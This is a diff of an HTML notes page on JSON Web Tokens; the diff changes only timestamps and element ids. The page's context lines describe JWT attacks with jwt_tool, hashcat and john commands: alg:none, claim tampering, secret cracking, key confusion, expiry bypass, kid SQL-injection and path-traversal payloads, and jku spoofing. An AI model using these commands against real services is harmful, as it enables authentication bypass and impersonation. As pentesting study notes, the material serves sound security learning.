@@ -3,7 +3,7 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2026-07-20 Mon 14:11 -->
+<!-- 2026-07-20 Mon 15:41 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>JSON Web Tokens</title>
@@ -927,7 +927,7 @@ Related: <a href="../org/20260206T060739--web-security__concept_cybersecurity.ht
 A JWT consists of three Base64URL-encoded parts separated by dots:
 </p>
 
-<pre class="example" id="orge9cbfcc">
+<pre class="example" id="orgf87a08b">
 header.payload.signature
 
 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
@@ -939,11 +939,11 @@ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
 <h3 id="org0668ee5">Header</h3>
 <div class="outline-text-3" id="text-org0668ee5">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>JSON</span><button class='copyBtn' name=btn_7413dcef736e46a38b99f2d267d3a4a7>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>JSON</span><button class='copyBtn' name=btn_be7c4f81a6f34abca8b2580e1c91e2e7>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_7413dcef736e46a38b99f2d267d3a4a7=document.querySelector('button[name=btn_7413dcef736e46a38b99f2d267d3a4a7]');
-copyBtnbtn_7413dcef736e46a38b99f2d267d3a4a7.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`{ \"alg\": \"HS256\", \"typ\": \"JWT\" }\n`);copyBtnbtn_7413dcef736e46a38b99f2d267d3a4a7.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_7413dcef736e46a38b99f2d267d3a4a7.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_be7c4f81a6f34abca8b2580e1c91e2e7=document.querySelector('button[name=btn_be7c4f81a6f34abca8b2580e1c91e2e7]');
+copyBtnbtn_be7c4f81a6f34abca8b2580e1c91e2e7.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`{ \"alg\": \"HS256\", \"typ\": \"JWT\" }\n`);copyBtnbtn_be7c4f81a6f34abca8b2580e1c91e2e7.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_be7c4f81a6f34abca8b2580e1c91e2e7.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -961,11 +961,11 @@ several major attack classes.
 <h3 id="org6067376">Payload (Claims)</h3>
 <div class="outline-text-3" id="text-org6067376">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>JSON</span><button class='copyBtn' name=btn_e448361ee0984ac3ac932343452aaf1f>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>JSON</span><button class='copyBtn' name=btn_85856e90ef9948e0923afcbc40996ba4>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_e448361ee0984ac3ac932343452aaf1f=document.querySelector('button[name=btn_e448361ee0984ac3ac932343452aaf1f]');
-copyBtnbtn_e448361ee0984ac3ac932343452aaf1f.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`{\n  \"sub\": \"1234\",\n  \"username\": \"user\",\n  \"role\": \"user\",\n  \"exp\": 1700000000,\n  \"iat\": 1699990000\n}\n`);copyBtnbtn_e448361ee0984ac3ac932343452aaf1f.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_e448361ee0984ac3ac932343452aaf1f.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_85856e90ef9948e0923afcbc40996ba4=document.querySelector('button[name=btn_85856e90ef9948e0923afcbc40996ba4]');
+copyBtnbtn_85856e90ef9948e0923afcbc40996ba4.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`{\n  \"sub\": \"1234\",\n  \"username\": \"user\",\n  \"role\": \"user\",\n  \"exp\": 1700000000,\n  \"iat\": 1699990000\n}\n`);copyBtnbtn_85856e90ef9948e0923afcbc40996ba4.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_85856e90ef9948e0923afcbc40996ba4.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1035,7 +1035,7 @@ can read it. Only the signature provides integrity.
 <div id="outline-container-orge0d1b70" class="outline-3">
 <h3 id="orge0d1b70">Signature</h3>
 <div class="outline-text-3" id="text-orge0d1b70">
-<pre class="example" id="orgb71887b">
+<pre class="example" id="org10cf51a">
 HMACSHA256(base64url(header) + "." + base64url(payload), secret)
 </pre>
 
@@ -1055,7 +1055,7 @@ forged without knowing the secret.
 <li><p>
 Client sends JWT in <code>Authorization</code> header on every API request:
 </p>
-<pre class="example" id="orga33518b">
+<pre class="example" id="org81697bc">
 Authorization: Bearer &lt;token&gt;
 </pre></li>
 <li>Server validates signature and reads claims — no session lookup</li>
@@ -1085,11 +1085,11 @@ fully attacker-controlled token.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_fc70964e97174c37a7aa19121ebf7d4e>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_460d4592c5e94b0fab20bc78aafc5fe5>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_fc70964e97174c37a7aa19121ebf7d4e=document.querySelector('button[name=btn_fc70964e97174c37a7aa19121ebf7d4e]');
-copyBtnbtn_fc70964e97174c37a7aa19121ebf7d4e.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# jwt_tool — automates none algorithm attack\npython3 jwt_tool.py <token> -X a\n\n# Manual steps:\n# 1. Decode header, change alg to none\n# 2. Modify payload as desired\n# 3. Re-encode both as Base64URL\n# 4. Submit with empty signature — trailing dot must be present\n# eyJ...header.eyJ...payload.\n`);copyBtnbtn_fc70964e97174c37a7aa19121ebf7d4e.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_fc70964e97174c37a7aa19121ebf7d4e.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_460d4592c5e94b0fab20bc78aafc5fe5=document.querySelector('button[name=btn_460d4592c5e94b0fab20bc78aafc5fe5]');
+copyBtnbtn_460d4592c5e94b0fab20bc78aafc5fe5.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# jwt_tool — automates none algorithm attack\npython3 jwt_tool.py <token> -X a\n\n# Manual steps:\n# 1. Decode header, change alg to none\n# 2. Modify payload as desired\n# 3. Re-encode both as Base64URL\n# 4. Submit with empty signature — trailing dot must be present\n# eyJ...header.eyJ...payload.\n`);copyBtnbtn_460d4592c5e94b0fab20bc78aafc5fe5.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_460d4592c5e94b0fab20bc78aafc5fe5.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1119,11 +1119,11 @@ signature.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_b49fb0be01d94e569a449c660fbe4981>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_9f11e8c62f23432c9e31de4fef34210e>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_b49fb0be01d94e569a449c660fbe4981=document.querySelector('button[name=btn_b49fb0be01d94e569a449c660fbe4981]');
-copyBtnbtn_b49fb0be01d94e569a449c660fbe4981.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# 1. Decode payload (no key needed)\necho \"eyJ...\" | base64 -d\n\n# 2. Modify claim (e.g. role → admin)\n# 3. Re-encode and resubmit with ORIGINAL unchanged signature\n# If application reflects the modified claim — verification absent\n\n# jwt_tool\npython3 jwt_tool.py <token> -T   # tamper mode — interactive\n`);copyBtnbtn_b49fb0be01d94e569a449c660fbe4981.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_b49fb0be01d94e569a449c660fbe4981.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_9f11e8c62f23432c9e31de4fef34210e=document.querySelector('button[name=btn_9f11e8c62f23432c9e31de4fef34210e]');
+copyBtnbtn_9f11e8c62f23432c9e31de4fef34210e.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# 1. Decode payload (no key needed)\necho \"eyJ...\" | base64 -d\n\n# 2. Modify claim (e.g. role → admin)\n# 3. Re-encode and resubmit with ORIGINAL unchanged signature\n# If application reflects the modified claim — verification absent\n\n# jwt_tool\npython3 jwt_tool.py <token> -T   # tamper mode — interactive\n`);copyBtnbtn_9f11e8c62f23432c9e31de4fef34210e.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_9f11e8c62f23432c9e31de4fef34210e.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1153,11 +1153,11 @@ is weak.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_66e56718412641bd941aa26d52dccfe1>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_acef6831e63349d5853ca2b43fae2b85>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_66e56718412641bd941aa26d52dccfe1=document.querySelector('button[name=btn_66e56718412641bd941aa26d52dccfe1]');
-copyBtnbtn_66e56718412641bd941aa26d52dccfe1.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Hashcat — mode 16500\nhashcat -a 0 -m 16500 <jwt_token> /usr/share/wordlists/rockyou.txt\n\n# John\njohn --wordlist=/usr/share/wordlists/rockyou.txt \\\n     --format=HMAC-SHA256 jwt.txt\n\n# jwt_tool brute force\npython3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt\n`);copyBtnbtn_66e56718412641bd941aa26d52dccfe1.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_66e56718412641bd941aa26d52dccfe1.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_acef6831e63349d5853ca2b43fae2b85=document.querySelector('button[name=btn_acef6831e63349d5853ca2b43fae2b85]');
+copyBtnbtn_acef6831e63349d5853ca2b43fae2b85.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Hashcat — mode 16500\nhashcat -a 0 -m 16500 <jwt_token> /usr/share/wordlists/rockyou.txt\n\n# John\njohn --wordlist=/usr/share/wordlists/rockyou.txt \\\n     --format=HMAC-SHA256 jwt.txt\n\n# jwt_tool brute force\npython3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt\n`);copyBtnbtn_acef6831e63349d5853ca2b43fae2b85.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_acef6831e63349d5853ca2b43fae2b85.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1177,11 +1177,11 @@ let res = copyTextToClipboard(`# Hashcat — mode 16500\nhashcat -a 0 -m 16500 <
 Once the secret is recovered, forge arbitrary tokens signed with it:
 </p>
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_53659df638b742b48fa8a588131690e4>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_6dbd6d241eb043a9a709034609dd5b37>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_53659df638b742b48fa8a588131690e4=document.querySelector('button[name=btn_53659df638b742b48fa8a588131690e4]');
-copyBtnbtn_53659df638b742b48fa8a588131690e4.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`python3 jwt_tool.py <token> -T -S hs256 -p \"secret\"\n`);copyBtnbtn_53659df638b742b48fa8a588131690e4.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_53659df638b742b48fa8a588131690e4.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_6dbd6d241eb043a9a709034609dd5b37=document.querySelector('button[name=btn_6dbd6d241eb043a9a709034609dd5b37]');
+copyBtnbtn_6dbd6d241eb043a9a709034609dd5b37.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`python3 jwt_tool.py <token> -T -S hs256 -p \"secret\"\n`);copyBtnbtn_6dbd6d241eb043a9a709034609dd5b37.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_6dbd6d241eb043a9a709034609dd5b37.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1204,11 +1204,11 @@ with the public key as the HMAC secret bypasses verification.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_7f82a44f47274c269dba41927e5c8799>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_2fce97915a764fafa0c9d30d494ab81d>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_7f82a44f47274c269dba41927e5c8799=document.querySelector('button[name=btn_7f82a44f47274c269dba41927e5c8799]');
-copyBtnbtn_7f82a44f47274c269dba41927e5c8799.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# 1. Obtain server's RSA public key\ncurl https://$TARGET/.well-known/jwks.json\ncurl https://$TARGET/api/auth/keys\n\n# 2. jwt_tool confusion attack\npython3 jwt_tool.py <token> -X k -pk public.pem\n\n# Manual:\n# 1. Change alg from RS256 to HS256\n# 2. Sign with RSA public key as HMAC secret\n`);copyBtnbtn_7f82a44f47274c269dba41927e5c8799.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_7f82a44f47274c269dba41927e5c8799.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_2fce97915a764fafa0c9d30d494ab81d=document.querySelector('button[name=btn_2fce97915a764fafa0c9d30d494ab81d]');
+copyBtnbtn_2fce97915a764fafa0c9d30d494ab81d.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# 1. Obtain server's RSA public key\ncurl https://$TARGET/.well-known/jwks.json\ncurl https://$TARGET/api/auth/keys\n\n# 2. jwt_tool confusion attack\npython3 jwt_tool.py <token> -X k -pk public.pem\n\n# Manual:\n# 1. Change alg from RS256 to HS256\n# 2. Sign with RSA public key as HMAC secret\n`);copyBtnbtn_2fce97915a764fafa0c9d30d494ab81d.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_2fce97915a764fafa0c9d30d494ab81d.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1238,11 +1238,11 @@ Server does not validate the <code>exp</code> claim.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_33438bad1dcf4312bfb3df82b260e2e5>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_d5fdcd6c09cd46fdacca42716081cafc>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_33438bad1dcf4312bfb3df82b260e2e5=document.querySelector('button[name=btn_33438bad1dcf4312bfb3df82b260e2e5]');
-copyBtnbtn_33438bad1dcf4312bfb3df82b260e2e5.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Resubmit captured token after expiry\n# Or tamper exp to a past Unix timestamp\npython3 jwt_tool.py <token> -T   # modify exp field\n\n# If server accepts it — expiry not enforced\n`);copyBtnbtn_33438bad1dcf4312bfb3df82b260e2e5.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_33438bad1dcf4312bfb3df82b260e2e5.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_d5fdcd6c09cd46fdacca42716081cafc=document.querySelector('button[name=btn_d5fdcd6c09cd46fdacca42716081cafc]');
+copyBtnbtn_d5fdcd6c09cd46fdacca42716081cafc.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Resubmit captured token after expiry\n# Or tamper exp to a past Unix timestamp\npython3 jwt_tool.py <token> -T   # modify exp field\n\n# If server accepts it — expiry not enforced\n`);copyBtnbtn_d5fdcd6c09cd46fdacca42716081cafc.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_d5fdcd6c09cd46fdacca42716081cafc.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1271,11 +1271,11 @@ verification key. These are attacker-controlled.
 <h4 id="org4ee6535"><code>kid</code> (Key ID) Injection</h4>
 <div class="outline-text-4" id="text-org4ee6535">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_b1460f5f869943f99eb81f4a94a200d4>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_d021e47da7e141ebbd5560130958a49d>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_b1460f5f869943f99eb81f4a94a200d4=document.querySelector('button[name=btn_b1460f5f869943f99eb81f4a94a200d4]');
-copyBtnbtn_b1460f5f869943f99eb81f4a94a200d4.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# SQL injection via kid\n# Set kid to: ' UNION SELECT 'attacker_secret' --\n# Server queries DB with unsanitised kid → returns known value\n# Sign token with that known value\n\n# Path traversal via kid\n# Set kid to: ../../dev/null\n# Server reads /dev/null as key (empty) → sign with empty string\npython3 jwt_tool.py <token> -T   # set kid to traversal payload\n# Then sign with empty secret\npython3 jwt_tool.py <token> -S hs256 -p \"\"\n`);copyBtnbtn_b1460f5f869943f99eb81f4a94a200d4.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_b1460f5f869943f99eb81f4a94a200d4.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_d021e47da7e141ebbd5560130958a49d=document.querySelector('button[name=btn_d021e47da7e141ebbd5560130958a49d]');
+copyBtnbtn_d021e47da7e141ebbd5560130958a49d.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# SQL injection via kid\n# Set kid to: ' UNION SELECT 'attacker_secret' --\n# Server queries DB with unsanitised kid → returns known value\n# Sign token with that known value\n\n# Path traversal via kid\n# Set kid to: ../../dev/null\n# Server reads /dev/null as key (empty) → sign with empty string\npython3 jwt_tool.py <token> -T   # set kid to traversal payload\n# Then sign with empty secret\npython3 jwt_tool.py <token> -S hs256 -p \"\"\n`);copyBtnbtn_d021e47da7e141ebbd5560130958a49d.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_d021e47da7e141ebbd5560130958a49d.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1298,11 +1298,11 @@ let res = copyTextToClipboard(`# SQL injection via kid\n# Set kid to: ' UNION SE
 <h4 id="orgb9f0ff9"><code>jku</code> / <code>x5u</code> (Remote Key URL)</h4>
 <div class="outline-text-4" id="text-orgb9f0ff9">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_db660053e9844d759f66a8941366ccd0>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_8dca2598b3c7483697dbe05cf615841f>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_db660053e9844d759f66a8941366ccd0=document.querySelector('button[name=btn_db660053e9844d759f66a8941366ccd0]');
-copyBtnbtn_db660053e9844d759f66a8941366ccd0.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# 1. Host malicious JWKS on attacker server\n# 2. Set jku in JWT header to attacker URL\n# 3. Sign token with attacker's private key\n# 4. Server fetches attacker's public key and verifies as valid\n\n# jwt_tool\npython3 jwt_tool.py <token> -X s   # self-signed JKU attack\n`);copyBtnbtn_db660053e9844d759f66a8941366ccd0.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_db660053e9844d759f66a8941366ccd0.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_8dca2598b3c7483697dbe05cf615841f=document.querySelector('button[name=btn_8dca2598b3c7483697dbe05cf615841f]');
+copyBtnbtn_8dca2598b3c7483697dbe05cf615841f.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# 1. Host malicious JWKS on attacker server\n# 2. Set jku in JWT header to attacker URL\n# 3. Sign token with attacker's private key\n# 4. Server fetches attacker's public key and verifies as valid\n\n# jwt_tool\npython3 jwt_tool.py <token> -X s   # self-signed JKU attack\n`);copyBtnbtn_8dca2598b3c7483697dbe05cf615841f.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_8dca2598b3c7483697dbe05cf615841f.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1384,7 +1384,7 @@ unsanitised to a database query or file path</li>
 <div id="outline-container-org8006599" class="outline-2">
 <h2 id="org8006599">Attack Decision Tree</h2>
 <div class="outline-text-2" id="text-org8006599">
-<pre class="example" id="org5f9d482">
+<pre class="example" id="orgac3a15b">
 JWT found in request
 │
 ├─ alg: none?
